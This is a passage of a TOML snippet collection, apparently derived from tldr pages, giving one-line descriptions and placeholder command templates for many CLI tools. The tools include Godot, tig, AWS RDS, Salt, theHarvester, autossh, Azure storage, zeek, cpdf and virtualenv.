  command = "godot -p"
  output = ""

[[snippets]]
  description = "Export a project for a given export preset (the preset must be defined in the project)"
  command = "godot --export <preset> <output_path>"
  output = ""

[[snippets]]
  description = "Execute a standalone GDScript file (the script must inherit from `SceneTree` or `MainLoop`)"
  command = "godot -s <script.gd>"
  output = ""

[[snippets]]
  description = "Encode a file with base64 encoding"
  command = "basenc --base64 <path/to/file>"
  output = ""

[[snippets]]
  description = "Decode a file with base64 encoding"
  command = "basenc --decode --base64 <path/to/file>"
  output = ""

[[snippets]]
  description = "Encode from `stdin` with base32 encoding with 42 columns"
  command = "<command> | basenc --base32 -w42"
  output = ""

[[snippets]]
  description = "Encode from `stdin` with base32 encoding"
  command = "<command> | basenc --base32"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xzgrep"
  output = ""

[[snippets]]
  description = "Convert a PPM image to a XPM image"
  command = "ppmtoxpm <path/to/input_file.ppm> > <path/to/output_file.xpm>"
  output = ""

[[snippets]]
  description = "Specify the prefix string in the output XPM image"
  command = "ppmtoxpm -name <prefix_string> <path/to/input_file.ppm> > <path/to/output_file.xpm>"
  output = ""

[[snippets]]
  description = "In the output XPM file, specify colors by their hexadecimal code instead of their name"
  command = "ppmtoxpm -hexonly <path/to/input_file.ppm> > <path/to/output_file.xpm>"
  output = ""

[[snippets]]
  description = "Use the specified PGM file as a transparency mask"
  command = "ppmtoxpm -alphamask <path/to/alpha_file.pgm> <path/to/input_file.ppm> > <path/to/output_file.xpm>"
  output = ""

[[snippets]]
  description = "List all feeds"
  command = "r2e list"
  output = ""

[[snippets]]
  description = "Convert RSS entries to email"
  command = "r2e run"
  output = ""

[[snippets]]
  description = "Add a feed"
  command = "r2e add <feed_address>"
  output = ""

[[snippets]]
  description = "Add a feed with a specific email address"
  command = "r2e add <feed_address> <new_email@example.com>"
  output = ""

[[snippets]]
  description = "Delete a specific feed"
  command = "r2e delete <number_of_feed_in_list>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "r2e -h"
  output = ""

[[snippets]]
  description = "Run the default task"
  command = "gulp"
  output = ""

[[snippets]]
  description = "Run individual tasks"
  command = "gulp <task> <othertask>"
  output = ""

[[snippets]]
  description = "Print the task dependency tree for the loaded gulpfile"
  command = "gulp --tasks"
  output = ""

[[snippets]]
  description = "Disassemble and list one or more `.class` files"
  command = "javap <path/to/file1.class path/to/file2.class ...>"
  output = ""

[[snippets]]
  description = "Disassemble and list a built-in class file"
  command = "javap java.<package>.<class>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "javap -help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "javap -version"
  output = ""

[[snippets]]
  description = "Show the sequence of commits starting from the current one in reverse chronological order"
  command = "tig"
  output = ""

[[snippets]]
  description = "Show the history of a specific branch"
  command = "tig <branch>"
  output = ""

[[snippets]]
  description = "Show the history of specific files or directories"
  command = "tig <path1 path2 ...>"
  output = ""

[[snippets]]
  description = "Show the difference between two references (such as branches or tags)"
  command = "tig <base_ref>..<compared_ref>"
  output = ""

[[snippets]]
  description = "Display commits from all branches and stashes"
  command = "tig --all"
  output = ""

[[snippets]]
  description = "Start in stash view, displaying all saved stashes"
  command = "tig stash"
  output = ""

[[snippets]]
  description = "Read a PPM image from the input file, convert it to a Berkeley YUV image and store it in the specified output file"
  command = "ppmtoeyuv <path/to/input_file.ppm> > <path/to/output_file.eyuv>"
  output = ""

[[snippets]]
  description = "View documentation for the current command"
  command = "tldr pamtowinicon"
  output = ""

[[snippets]]
  description = "Convert a string to a QR code and save to an output file"
  command = "qrencode -o <path/to/output_file.png> <string>"
  output = ""

[[snippets]]
  description = "Convert an input file to a QR code and save to an output file"
  command = "qrencode -o <path/to/output_file.png> -r <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Convert a string to a QR code and print it in terminal"
  command = "qrencode -t ansiutf8 <string>"
  output = ""

[[snippets]]
  description = "Convert input from pipe to a QR code and print it in terminal"
  command = "echo <string> | qrencode -t ansiutf8"
  output = ""

[[snippets]]
  description = "Display help for a specific RDS subcommand"
  command = "aws rds <subcommand> help"
  output = ""

[[snippets]]
  description = "Stop instance"
  command = "aws rds stop-db-instance --db-instance-identifier <instance_identifier>"
  output = ""

[[snippets]]
  description = "Start instance"
  command = "aws rds start-db-instance --db-instance-identifier <instance_identifier>"
  output = ""

[[snippets]]
  description = "Modify an RDS instance"
  command = "aws rds modify-db-instance --db-instance-identifier <instance_identifier> <parameters> --apply-immediately"
  output = ""

[[snippets]]
  description = "Apply updates to an RDS instance"
  command = "aws rds apply-pending-maintenance-action --resource-identifier <database_arn> --apply-action <system-update> --opt-in-type <immediate>"
  output = ""

[[snippets]]
  description = "Change an instance identifier"
  command = "aws rds modify-db-instance --db-instance-identifier <old_instance_identifier> --new-db-instance-identifier <new_instance_identifier>"
  output = ""

[[snippets]]
  description = "Reboot an instance"
  command = "aws rds reboot-db-instance --db-instance-identifier <instance_identifier>"
  output = ""

[[snippets]]
  description = "Delete an instance"
  command = "aws rds delete-db-instance --db-instance-identifier <instance_identifier> --final-db-snapshot-identifier <snapshot_identifier> --delete-automated-backups"
  output = ""

[[snippets]]
  description = "Display a cursor to select a window to display its attributes (id, name, size, position, ...)"
  command = "xwininfo"
  output = ""

[[snippets]]
  description = "Display the tree of all windows"
  command = "xwininfo -tree -root"
  output = ""

[[snippets]]
  description = "Display the attributes of a window with a specific ID"
  command = "xwininfo -id <id>"
  output = ""

[[snippets]]
  description = "Display the attributes of a window with a specific name"
  command = "xwininfo -name <name>"
  output = ""

[[snippets]]
  description = "Display the ID of a window searching by name"
  command = "xwininfo -tree -root | grep <keyword> | head -1 | perl -ne 'print $1 if /(0x[\da-f]+)/ig;'"
  output = ""

[[snippets]]
  description = "Connect to a serial console with a specified baud rate"
  command = "picocom </dev/ttyXYZ> --baud <baud_rate>"
  output = ""

[[snippets]]
  description = "Map special characters (e.g. `LF` to `CRLF`)"
  command = "picocom </dev/ttyXYZ> --imap <lfcrlf>"
  output = ""

[[snippets]]
  description = "Gather information on a domain using Google"
  command = "theHarvester --domain <domain_name> --source google"
  output = ""

[[snippets]]
  description = "Gather information on a domain using multiple sources"
  command = "theHarvester --domain <domain_name> --source <google,bing,crtsh>"
  output = ""

[[snippets]]
  description = "Change the limit of results to work with"
  command = "theHarvester --domain <domain_name> --source <google> --limit <200>"
  output = ""

[[snippets]]
  description = "Save the output to two files in XML and HTML format"
  command = "theHarvester --domain <domain_name> --source <google> --file <output_file_name>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "theHarvester --help"
  output = ""

[[snippets]]
  description = "List all accepted, unaccepted and rejected minion keys"
  command = "salt-key -L"
  output = ""

[[snippets]]
  description = "Accept a minion key by name"
  command = "salt-key -a <MINION_ID>"
  output = ""

[[snippets]]
  description = "Reject a minion key by name"
  command = "salt-key -r <MINION_ID>"
  output = ""

[[snippets]]
  description = "Print fingerprints of all public keys"
  command = "salt-key -F"
  output = ""

[[snippets]]
  description = "Upload an artifact to Rekor"
  command = "rekor-cli upload --artifact <path/to/file.ext> --signature <path/to/file.ext.sig> --pki-format=<x509> --public-key=<path/to/key.pub>"
  output = ""

[[snippets]]
  description = "Get information regarding entries in the Transparency Log"
  command = "rekor-cli get --uuid=<0e81b4d9299e2609e45b5c453a4c0e7820ac74e02c4935a8b830d104632fd2d1>"
  output = ""

[[snippets]]
  description = "Search the Rekor index to find entries by Artifact"
  command = "rekor-cli search --artifact <path/to/file.ext>"
  output = ""

[[snippets]]
  description = "Search the Rekor index to find entries by a specific hash"
  command = "rekor-cli search --sha <6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b>"
  output = ""

[[snippets]]
  description = "Update all components to the latest version"
  command = "gcloud components update"
  output = ""

[[snippets]]
  description = "Update all components to a specific version"
  command = "gcloud components update --version=<1.2.3>"
  output = ""

[[snippets]]
  description = "Update components without confirmation (useful for automation scripts)"
  command = "gcloud components update --quiet"
  output = ""

[[snippets]]
  description = "Interactively create a new `wapm.toml` file"
  command = "wapm init"
  output = ""

[[snippets]]
  description = "Download all the packages listed as dependencies in `wapm.toml`"
  command = "wapm install"
  output = ""

[[snippets]]
  description = "Download a specific version of a package and add it to the list of dependencies in `wapm.toml`"
  command = "wapm install <package>@<version>"
  output = ""

[[snippets]]
  description = "Download a package and install it globally"
  command = "wapm install --global <package>"
  output = ""

[[snippets]]
  description = "Uninstall a package and remove it from the list of dependencies in `wapm.toml`"
  command = "wapm uninstall <package>"
  output = ""

[[snippets]]
  description = "Print a tree of locally installed dependencies"
  command = "wapm list"
  output = ""

[[snippets]]
  description = "List top-level globally installed packages"
  command = "wapm list --global"
  output = ""

[[snippets]]
  description = "Execute a package command using the Wasmer runtime"
  command = "wapm run <command_name> <arguments>"
  output = ""

[[snippets]]
  description = "List all sinks and sources with their corresponding IDs"
  command = "pamixer --list-sinks --list-sources"
  output = ""

[[snippets]]
  description = "Set the volume to 75% on the default sink"
  command = "pamixer --set-volume <75>"
  output = ""

[[snippets]]
  description = "Toggle mute on a sink other than the default"
  command = "pamixer --toggle-mute --sink <ID>"
  output = ""

[[snippets]]
  description = "Increase the volume on default sink by 5%"
  command = "pamixer --increase <5>"
  output = ""

[[snippets]]
  description = "Decrease the volume on a source by 5%"
  command = "pamixer --decrease <5> --source <ID>"
  output = ""

[[snippets]]
  description = "Use the allow boost option to increase, decrease, or set the volume above 100%"
  command = "pamixer --set-volume <105> --allow-boost"
  output = ""

[[snippets]]
  description = "Mute the default sink (use `--unmute` instead to unmute)"
  command = "pamixer --mute"
  output = ""

[[snippets]]
  description = "List connected minions"
  command = "salt '*' test.ping"
  output = ""

[[snippets]]
  description = "Execute a highstate on all connected minions"
  command = "salt '*' state.highstate"
  output = ""

[[snippets]]
  description = "Upgrade packages using the OS package manager (apt, yum, brew) on a subset of minions"
  command = "salt '*.example.com' pkg.upgrade"
  output = ""

[[snippets]]
  description = "Execute an arbitrary command on a particular minion"
  command = "salt '<minion_id>' cmd.run ""ls """
  output = ""

[[snippets]]
  description = "Return a successful exit code"
  command = "true"
  output = ""

[[snippets]]
  description = "Run a flow check"
  command = "flow"
  output = ""

[[snippets]]
  description = "Check which files are being checked by flow"
  command = "flow ls"
  output = ""

[[snippets]]
  description = "Run a type coverage check on all files in a directory"
  command = "flow batch-coverage --show-all --strip-root <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display line-by-line type coverage stats"
  command = "flow coverage --color <path/to/file.jsx>"
  output = ""

[[snippets]]
  description = "Convert a Andrew Toolkit raster object to a PBM image"
  command = "atktopbm <path/to/image.atk> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Display a list of available aliased Phars"
  command = "phive list"
  output = ""

[[snippets]]
  description = "Install a specified Phar to the local directory"
  command = "phive install <alias|url>"
  output = ""

[[snippets]]
  description = "Install a specified Phar globally"
  command = "phive install <alias|url> --global"
  output = ""

[[snippets]]
  description = "Install a specified Phar to a target directory"
  command = "phive install <alias|url> --target <path/to/directory>"
  output = ""

[[snippets]]
  description = "Update all Phar files to the latest version"
  command = "phive update"
  output = ""

[[snippets]]
  description = "Remove a specified Phar file"
  command = "phive remove <alias|url>"
  output = ""

[[snippets]]
  description = "Remove unused Phar files"
  command = "phive purge"
  output = ""

[[snippets]]
  description = "List all available commands"
  command = "phive help"
  output = ""

[[snippets]]
  description = "Cancel the current job of the default printer (set with `lpoptions -d {{printer}}`)"
  command = "cancel"
  output = ""

[[snippets]]
  description = "Cancel the jobs of the default printer owned by a specific [u]ser"
  command = "cancel -u <username>"
  output = ""

[[snippets]]
  description = "Cancel the current job of a specific printer"
  command = "cancel <printer>"
  output = ""

[[snippets]]
  description = "Cancel a specific job from a specific printer"
  command = "cancel <printer>-<job_id>"
  output = ""

[[snippets]]
  description = "Cancel [a]ll jobs of all printers"
  command = "cancel -a"
  output = ""

[[snippets]]
  description = "Cancel [a]ll jobs of a specific printer"
  command = "cancel -a <printer>"
  output = ""

[[snippets]]
  description = "Cancel the current job of a specific server and then delete ([x]) job data files"
  command = "cancel -h <server> -x"
  output = ""

[[snippets]]
  description = "Symlink all files recursively to a given directory"
  command = "stow --target=<path/to/target_directory> <file1 directory1 file2 directory2>"
  output = ""

[[snippets]]
  description = "Delete symlinks recursively from a given directory"
  command = "stow --delete --target=<path/to/target_directory> <file1 directory1 file2 directory2>"
  output = ""

[[snippets]]
  description = "Simulate to see what the result would be like"
  command = "stow --simulate --target=<path/to/target_directory> <file1 directory1 file2 directory2>"
  output = ""

[[snippets]]
  description = "Delete and resymlink"
  command = "stow --restow --target=<path/to/target_directory> <file1 directory1 file2 directory2>"
  output = ""

[[snippets]]
  description = "Exclude files matching a regular expression"
  command = "stow --ignore=<regular_expression> --target=<path/to/target_directory> <file1 directory1 file2 directory2>"
  output = ""

[[snippets]]
  description = "Create a new Python `virtualenv` in `$WORKON_HOME`"
  command = "mkvirtualenv <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Create a `virtualenv` for a specific Python version"
  command = "mkvirtualenv --python </usr/local/bin/python3.8> <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Activate or use a different `virtualenv`"
  command = "workon <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Stop the `virtualenv`"
  command = "deactivate"
  output = ""

[[snippets]]
  description = "List all virtual environments"
  command = "lsvirtualenv"
  output = ""

[[snippets]]
  description = "Remove a `virtualenv`"
  command = "rmvirtualenv <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Get summary of all virtualenvwrapper commands"
  command = "virtualenvwrapper"
  output = ""

[[snippets]]
  description = "Start an SSH session, restarting when the [M]onitoring port fails to return data"
  command = "autossh -M <monitor_port> ""<ssh_command>"""
  output = ""

[[snippets]]
  description = "Forward a [L]ocal port to a remote one, restarting when necessary"
  command = "autossh -M <monitor_port> -L <local_port>:localhost:<remote_port> <user>@<host>"
  output = ""

[[snippets]]
  description = "Fork `autossh` into the background before executing `ssh` and do [N]ot open a remote shell"
  command = "autossh -f -M <monitor_port> -N ""<ssh_command>"""
  output = ""

[[snippets]]
  description = "Run in the background, with no monitoring port, and instead send SSH keep-alive packets every 10 seconds to detect failure"
  command = "autossh -f -M 0 -N -o ""ServerAliveInterval 10"" -o ""ServerAliveCountMax 3"" ""<ssh_command>"""
  output = ""

[[snippets]]
  description = "Run in the background, with no monitoring port and no remote shell, exiting if the port forward fails"
  command = "autossh -f -M 0 -N -o ""ServerAliveInterval 10"" -o ""ServerAliveCountMax 3"" -o ExitOnForwardFailure=yes -L <local_port>:localhost:<remote_port> <user>@<host>"
  output = ""

[[snippets]]
  description = "Run in the background, logging `autossh` debug output and `ssh` verbose output to files"
  command = "AUTOSSH_DEBUG=1 AUTOSSH_LOGFILE=<path/to/autossh_log_file.log> autossh -f -M <monitor_port> -v -E <path/to/ssh_log_file.log> <ssh_command>"
  output = ""

[[snippets]]
  description = "Print the 5th item from a line (starting from 0)"
  command = "choose <4>"
  output = ""

[[snippets]]
  description = "Print the first, 3rd, and 5th item from a line, where items are separated by ':' instead of whitespace"
  command = "choose --field-separator '<:>' <0> <2> <4>"
  output = ""

[[snippets]]
  description = "Print everything from the 2nd to 5th item on the line, including the 5th"
  command = "choose <1>:<4>"
  output = ""

[[snippets]]
  description = "Print everything from the 2nd to 5th item on the line, excluding the 5th"
  command = "choose --exclusive <1>:<4>"
  output = ""

[[snippets]]
  description = "Print the beginning of the line to the 3rd item"
  command = "choose :<2>"
  output = ""

[[snippets]]
  description = "Print all items from the beginning of the line until the 3rd item (exclusive)"
  command = "choose --exclusive :<2>"
  output = ""

[[snippets]]
  description = "Print all items from the 3rd to the end of the line"
  command = "choose <2>:"
  output = ""

[[snippets]]
  description = "Print the last item from a line"
  command = "choose <-1>"
  output = ""

[[snippets]]
  description = "Log in using the default web browser with a Vercel account"
  command = "turbo login"
  output = ""

[[snippets]]
  description = "Link the current directory to a Vercel organization and enable remote caching"
  command = "turbo link"
  output = ""

[[snippets]]
  description = "Build the current project"
  command = "turbo run build"
  output = ""

[[snippets]]
  description = "Run a task without concurrency"
  command = "turbo run <task_name> --concurrency=<1>"
  output = ""

[[snippets]]
  description = "Run a task ignoring cached artifacts and forcibly re-execute all tasks"
  command = "turbo run <task_name> --force"
  output = ""

[[snippets]]
  description = "Run a task in parallel across packages"
  command = "turbo run <task_name> --parallel --no-cache"
  output = ""

[[snippets]]
  description = "Unlink the current directory from your Vercel organization and disable Remote Caching"
  command = "turbo unlink"
  output = ""

[[snippets]]
  description = "Generate a Dot graph of a specific task execution (the output file format can be controlled with the filename)"
  command = "turbo run <task_name> --graph=<path/to/file.html|jpg|json|pdf|png|svg>"
  output = ""

[[snippets]]
  description = "Create a storage account specifying a [l]ocation"
  command = "az storage account create --resource-group <group_name> --name <account_name> -l <location> --sku <account_sku>"
  output = ""

[[snippets]]
  description = "List all storage accounts in a resource group"
  command = "az storage account list --resource-group <group_name>"
  output = ""

[[snippets]]
  description = "List the access keys for a storage account"
  command = "az storage account keys list --resource-group <group_name> --name <account_name>"
  output = ""

[[snippets]]
  description = "Delete a storage account"
  command = "az storage account delete --resource-group <group_name> --name <account_name>"
  output = ""

[[snippets]]
  description = "Update the minimum tls version setting for a storage account"
  command = "az storage account update --min-tls-version <TLS1_0|TLS1_1|TLS1_2> --resource-group <group_name> --name <account_name>"
  output = ""

[[snippets]]
  description = "Run a benchmark for `30` seconds, using `12` threads, and keeping `400` HTTP connections open"
  command = "wrk -t<12> -c<400> -d<30s> ""<http://127.0.0.1:8080/index.html>"""
  output = ""

[[snippets]]
  description = "Run a benchmark with a custom header"
  command = "wrk -t<2> -c<5> -d<5s> -H ""<Host: example.com>"" ""<http://example.com/index.html>"""
  output = ""

[[snippets]]
  description = "Run a benchmark with a request timeout of `2` seconds"
  command = "wrk -t<2> -c<5> -d<5s> --timeout <2s> ""<http://example.com/index.html>"""
  output = ""

[[snippets]]
  description = "Analyze live traffic from a network interface"
  command = "sudo zeek --iface <interface>"
  output = ""

[[snippets]]
  description = "Analyze live traffic from a network interface and load custom scripts"
  command = "sudo zeek --iface <interface> <script1> <script2>"
  output = ""

[[snippets]]
  description = "Analyze live traffic from a network interface, without loading any scripts"
  command = "sudo zeek --bare-mode --iface <interface>"
  output = ""

[[snippets]]
  description = "Analyze live traffic from a network interface, applying a `tcpdump` filter"
  command = "sudo zeek --filter <path/to/filter> --iface <interface>"
  output = ""

[[snippets]]
  description = "Analyze live traffic from a network interface using a watchdog timer"
  command = "sudo zeek --watchdog --iface <interface>"
  output = ""

[[snippets]]
  description = "Analyze traffic from a `pcap` file"
  command = "zeek --readfile <path/to/file.trace>"
  output = ""

[[snippets]]
  description = "Initialize a backup repository in a given local [d]irectory"
  command = "bup -d <path/to/repository> init"
  output = ""

[[snippets]]
  description = "Prepare a given [d]irectory before taking a backup"
  command = "bup -d <path/to/repository> index <path/to/directory>"
  output = ""

[[snippets]]
  description = "Backup a [d]irectory to the repository specifying its [n]ame"
  command = "bup -d <path/to/repository> save -n <backup_name> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Show the backup snapshots currently stored in the repository"
  command = "bup -d <path/to/repository> ls"
  output = ""

[[snippets]]
  description = "Restore a specific backup snapshot to a target dire[C]tory"
  command = "bup -d <path/to/repository> restore -C <path/to/target_directory> <backup_name>"
  output = ""

[[snippets]]
  description = "Initialize Git LFS"
  command = "git lfs install"
  output = ""

[[snippets]]
  description = "Track files that match a glob"
  command = "git lfs track '<*.bin>'"
  output = ""

[[snippets]]
  description = "Change the Git LFS endpoint URL (useful if the LFS server is separate from the Git server)"
  command = "git config -f .lfsconfig lfs.url <lfs_endpoint_url>"
  output = ""

[[snippets]]
  description = "List tracked patterns"
  command = "git lfs track"
  output = ""

[[snippets]]
  description = "List tracked files that have been committed"
  command = "git lfs ls-files"
  output = ""

[[snippets]]
  description = "Push all Git LFS objects to the remote server (useful if errors are encountered)"
  command = "git lfs push --all <remote_name> <branch_name>"
  output = ""

[[snippets]]
  description = "Fetch all Git LFS objects"
  command = "git lfs fetch"
  output = ""

[[snippets]]
  description = "Checkout all Git LFS objects"
  command = "git lfs checkout"
  output = ""

[[snippets]]
  description = "Produce a mask of areas of a certain color in the specified PPM image"
  command = "ppmcolormask -color <red,blue> <path/to/input.ppm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Build overview images of a raster dataset using the "average" [r]esampling method"
  command = "gdaladdo -r average <path/to/input.tif>"
  output = ""

[[snippets]]
  description = "Create the documentation"
  command = "yard"
  output = ""

[[snippets]]
  description = "Create the documentation and save it to one file"
  command = "yard --one-file"
  output = ""

[[snippets]]
  description = "List all undocumented objects"
  command = "yard stats --list-undoc"
  output = ""

[[snippets]]
  description = "Initialize a `.fossa.yml` configuration file"
  command = "fossa init"
  output = ""

[[snippets]]
  description = "Run a default project build"
  command = "fossa build"
  output = ""

[[snippets]]
  description = "Analyze built dependencies"
  command = "fossa analyze"
  output = ""

[[snippets]]
  description = "Generate reports"
  command = "fossa report"
  output = ""

[[snippets]]
  description = "Test current revision against the FOSSA scan status and exit with errors if issues are found"
  command = "fossa test"
  output = ""

[[snippets]]
  description = "Connect to a server"
  command = "cradle connect <server_name>"
  output = ""

[[snippets]]
  description = "Execute a Cradle command"
  command = "cradle <command>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "cradle help"
  output = ""

[[snippets]]
  description = "Display help for a specific command"
  command = "cradle <command> help"
  output = ""

[[snippets]]
  description = "Create a table with partition and lifecycle"
  command = "create table <table_name> (<col> <type>) partitioned by (<col> <type>) lifecycle <days>;"
  output = ""

[[snippets]]
  description = "Create a table based on the definition of another table"
  command = "create table <table_name> like <another_table>;"
  output = ""

[[snippets]]
  description = "Add partition to a table"
  command = "alter table <table_name> add partition (<partition_spec>);"
  output = ""

[[snippets]]
  description = "Delete partition from a table"
  command = "alter table <table_name> drop partition (<partition_spec>);"
  output = ""

[[snippets]]
  description = "Delete table"
  command = "drop table <table_name>;"
  output = ""

[[snippets]]
  description = "Start the server"
  command = "minetestserver"
  output = ""

[[snippets]]
  description = "List available worlds"
  command = "minetestserver --world list"
  output = ""

[[snippets]]
  description = "Load the specified world"
  command = "minetestserver --world <world_name>"
  output = ""

[[snippets]]
  description = "List the available game IDs"
  command = "minetestserver --gameid list"
  output = ""

[[snippets]]
  description = "Use the specified game"
  command = "minetestserver --gameid <game_id>"
  output = ""

[[snippets]]
  description = "Listen on a specific port"
  command = "minetestserver --port <34567>"
  output = ""

[[snippets]]
  description = "Migrate to a different data backend"
  command = "minetestserver --migrate <sqlite3|leveldb|redis>"
  output = ""

[[snippets]]
  description = "Start an interactive terminal after starting the server"
  command = "minetestserver --terminal"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a PPA file"
  command = "pbmtoppa <path/to/image.pbm> > <path/to/output.ppa>"
  output = ""

[[snippets]]
  description = "Specify the desired dots-per-inch and paper size"
  command = "pbmtoppa -d <300> -s <a4> <path/to/image.pbm> > <path/to/output.ppa>"
  output = ""

[[snippets]]
  description = "Search for all available versions of a particular package"
  command = "mamba repoquery search <package>"
  output = ""

[[snippets]]
  description = "Search for all packages satisfying specific constraints"
  command = "mamba repoquery search <sphinx<5>"
  output = ""

[[snippets]]
  description = "List the dependencies of a package installed in the currently activated environment, in a tree format"
  command = "mamba repoquery depends --tree <scipy>"
  output = ""

[[snippets]]
  description = "Print packages in the current environment that require a particular package to be installed (i.e. inverse of `depends`)"
  command = "mamba repoquery whoneeds <ipython>"
  output = ""

[[snippets]]
  description = "Select pages 1, 2, 3 and 6 from a source document and write those to a destination document"
  command = "cpdf <path/to/source_document.pdf> <1-3,6> -o <path/to/destination_document.pdf>"
  output = ""

[[snippets]]
  description = "Merge two documents into a new one"
  command = "cpdf -merge <path/to/source_document_one.pdf> <path/to/source_document_two.pdf> -o <path/to/destination_document.pdf>"
  output = ""

[[snippets]]
  description = "Show the bookmarks of a document"
  command = "cpdf -list-bookmarks <path/to/document.pdf>"
  output = ""

[[snippets]]
  description = "Split a document into ten-page chunks, writing them to `chunk001.pdf`, `chunk002.pdf`, etc"
  command = "cpdf -split <path/to/document.pdf> -o <path/to/chunk%%%.pdf> -chunk <10>"
  output = ""

[[snippets]]
  description = "Encrypt a document using 128bit encryption, providing `fred` as owner password and `joe` as user password"
  command = "cpdf -encrypt <128bit> <fred> <joe> <path/to/source_document.pdf> -o <path/to/encrypted_document.pdf>"
  output = ""

[[snippets]]
  description = "Decrypt a document using the owner password `fred`"
  command = "cpdf -decrypt <path/to/encrypted_document.pdf> owner=<fred> -o <path/to/decrypted_document.pdf>"
  output = ""

[[snippets]]
  description = "Show the annotations of a document"
  command = "cpdf -list-annotations <path/to/document.pdf>"
  output = ""

[[snippets]]
  description = "Create a new document from an existing one with additional metadata"
  command = "cpdf -set-metadata <path/to/metadata.xml> <path/to/source_document.pdf> -o <path/to/destination_document.pdf>"
  output = ""

[[snippets]]
  description = "Stamp the last commit message referencing it with the issue number from your bug tracker"
  command = "git stamp <issue_number>"
  output = ""

[[snippets]]
  description = "Stamp the last commit message linking it to its review page"
  command = "git stamp <Review https://example.org/path/to/review>"
  output = ""

[[snippets]]
  description = "Stamp the last commit message replacing previous issues with a new one"
  command = "git stamp --replace <issue_number>"
  output = ""

[[snippets]]
  description = "Remove the most recent commit"
  command = "git undo"
  output = ""

[[snippets]]
  description = "Remove a specific number of the most recent commits"
  command = "git undo <3>"
  output = ""

[[snippets]]
  description = "Match and rewrite templates, and print changes"
  command = "comby '<assert_eq!(:[a], :[b])>' '<assert_eq!(:[b], :[a])>' <.rs>"
  output = ""

[[snippets]]
  description = "Match and rewrite with rewrite properties"
  command = "comby '<assert_eq!(:[a], :[b])>' '<assert_eq!(:[b].Capitalize, :[a])>' <.rs>"
  output = ""

[[snippets]]
  description = "Match and rewrite in-place"
  command = "comby -in-place '<match_pattern>' '<rewrite_pattern>'"
  output = ""

[[snippets]]
  description = "Only perform matching and print matches"
  command = "comby -match-only '<match_pattern>' """""
  output = ""

[[snippets]]
  description = "Print a table from JSON or JSON Lines input"
  command = "cat <file.json> | jtbl"
  output = ""

[[snippets]]
  description = "Print a table and specify the column width for wrapping"
  command = "cat <file.json> | jtbl --cols=<width>"
  output = ""

[[snippets]]
  description = "Print a table and truncate rows instead of wrapping"
  command = "cat <file.json> | jtbl -t"
  output = ""

[[snippets]]
  description = "Print a table and don't wrap or truncate rows"
  command = "cat <file.json> | jtbl -n"
  output = ""

[[snippets]]
  description = "View the documentation for the command referring to the latest, cross-platform version of PowerShell (version 6 and above)"
  command = "tldr pwsh"
  output = ""

[[snippets]]
  description = "View the documentation for the command referring to the legacy Windows PowerShell (version 5.1 and below)"
  command = "tldr powershell -p windows"
  output = ""

[[snippets]]
  description = "Create a new environment"
  command = "virtualenv <path/to/venv>"
  output = ""

[[snippets]]
  description = "Customize the prompt prefix"
  command = "virtualenv --prompt=<prompt_prefix> <path/to/venv>"
  output = ""

[[snippets]]
  description = "Use a different version of Python with virtualenv"
  command = "virtualenv --python=<path/to/pythonbin> <path/to/venv>"
  output = ""

[[snippets]]
  description = "Start (select) the environment"
  command = "source <path/to/venv>/bin/activate"
  output = ""

[[snippets]]
  description = "Stop the environment"
  command = "deactivate"
  output = ""

[[snippets]]
  description = "Start SC-IM"
  command = "scim <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Enter a string into the current cell"
  command = "<<|>>"
  output = ""

[[snippets]]
  description = "Enter a numeric constant into the current cell"
  command = "="
  output = ""

[[snippets]]
  description = "Edit string in the current cell"
  command = "E"
  output = ""

[[snippets]]
  description = "Edit number in the current cell"
  command = "e"
  output = ""

[[snippets]]
  description = "Center align the current cell"
  command = "|"
  output = ""

[[snippets]]
  description = "Create a hard link from a new file to an existing file"
  command = "link <path/to/existing_file> <path/to/new_file>"
  output = ""

[[snippets]]
  description = "Calculate contributions for the current Git repository"
  command = "git fame"
  output = ""

[[snippets]]
  description = "Exclude files/directories that match the specified regular expression"
  command = "git fame --excl ""<regular_expression>"""
  output = ""

[[snippets]]
  description = "Calculate contributions made after the specified date"
  command = "git fame --since ""<3 weeks ago|2021-05-13>"""
  output = ""

[[snippets]]
  description = "Display contributions in the specified format"
  command = "git fame --format <pipe|yaml|json|csv|tsv>"
  output = ""

[[snippets]]
  description = "Display contributions per file extension"
  command = "git fame --bytype"
  output = ""

[[snippets]]
  description = "Ignore whitespace changes"
  command = "git fame --ignore-whitespace"
  output = ""

[[snippets]]
  description = "Detect inter-file line moves and copies"
  command = "git fame -C"
  output = ""

[[snippets]]
  description = "Detect intra-file line moves and copies"
  command = "git fame -M"
  output = ""

[[snippets]]
  description = "Change `stdin` buffer size to 512 KiB"
  command = "stdbuf --input=<512K> <command>"
  output = ""

[[snippets]]
  description = "Change `stdout` buffer to line-buffered"
  command = "stdbuf --output=<L> <command>"
  output = ""

[[snippets]]
  description = "Change `stderr` buffer to unbuffered"
  command = "stdbuf --error=<0> <command>"
  output = ""

[[snippets]]
  description = "Generate a PGM image containing white noise"
  command = "pgmnoise <width> <height> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Specify the seed for the pseudo-random number generator"
  command = "pgmnoise <width> <height> -randomseed <value> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Append file content to the source file"
  command = "cat <path/to/file> | sponge -a <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove all lines starting with # in a file"
  command = "grep -v '^<#>' <path/to/file> | sponge <path/to/file>"
  output = ""

[[snippets]]
  description = "List domains, target IP addresses and on/off status"
  command = "hostess list"
  output = ""

[[snippets]]
  description = "Add a domain pointing to your machine to your hosts file"
  command = "hostess add <local.example.com> <127.0.0.1>"
  output = ""

[[snippets]]
  description = "Remove a domain from your hosts file"
